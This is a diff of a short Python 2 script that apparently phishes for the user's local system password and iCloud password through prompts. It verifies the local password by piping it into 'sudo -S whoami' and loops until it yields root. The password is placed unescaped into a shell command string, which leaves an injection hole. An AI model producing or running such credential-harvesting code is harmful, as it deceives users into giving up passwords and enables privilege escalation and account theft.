@@ -1,5 +1,10 @@
 import subprocess
 import checkiCloudEmail
+from time import sleep
+
+# Arguments
+# localpass
+# icloud pass
 
 def promptSystem():
     try:
@@ -19,19 +24,19 @@ def promptiCloud():
 
 def tryRoot(pw):
     try:
-        run_command = subprocess.check_output(
+        return subprocess.check_output(
         "echo '{0}' | sudo -S whoami".format(pw), shell=True)
     except subprocess.CalledProcessError:
-        pass
-    if "root" in run_command.rstrip():
-        return True
-    else:
-        return False
+        return "FALSE"
 
 if __name__ == "__main__":
-    icloudpass = promptiCloud()
-    print icloudpass
+    # icloudpass = promptiCloud()
+    # print icloudpass
     localpass = promptSystem()
-    while tryRoot(localpass) is not True:
+    # print "ITSSSS" + tryRoot(localpass)
+    while "root" not in tryRoot(localpass):
         localpass = promptSystem()
-    print localpass
+    # while tryRoot(localpass) is not True:
+    #     sleep(10)
+    #     localpass = promptSystem()
+    # print localpass
